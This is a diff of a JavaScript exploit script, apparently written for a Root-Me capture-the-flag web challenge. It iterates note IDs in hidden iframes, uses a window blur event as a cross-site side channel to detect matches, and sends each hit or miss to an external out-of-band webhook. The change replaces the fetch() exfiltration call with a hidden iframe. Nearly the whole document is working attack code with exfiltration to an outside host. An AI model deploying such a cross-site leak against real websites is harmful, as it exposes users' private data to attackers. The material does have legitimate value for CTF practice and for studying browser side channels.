@@ -2,25 +2,26 @@
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 let id = parseInt(new URLSearchParams(window.location.search).get('id'), 10) || 1;
-
+    
 function next() {
+    
     const iframe = document.createElement("iframe");
     iframe.src = TARGET + id + "#search_note";
     document.documentElement.appendChild(iframe);
-
     let hit = false;
-
     window.onblur = () => { hit = true; };
-
     iframe.onload = () => setTimeout(done, 4000);
-
+    
     function done() {
-        fetch(WEBHOOK + "?result=" + (hit ? "hit" : "miss") + "&id=" + id);
+        const exfil = document.createElement("iframe");
+        exfil.src = WEBHOOK + "?result=" + (hit ? "hit" : "miss") + "&id=" + id;
+        document.documentElement.appendChild(exfil);
         iframe.style.display = "none";
+        exfil.style.display = "none";
         id++;
         setTimeout(next, 500);
     }
 }
-
+    
 next();
 </script>
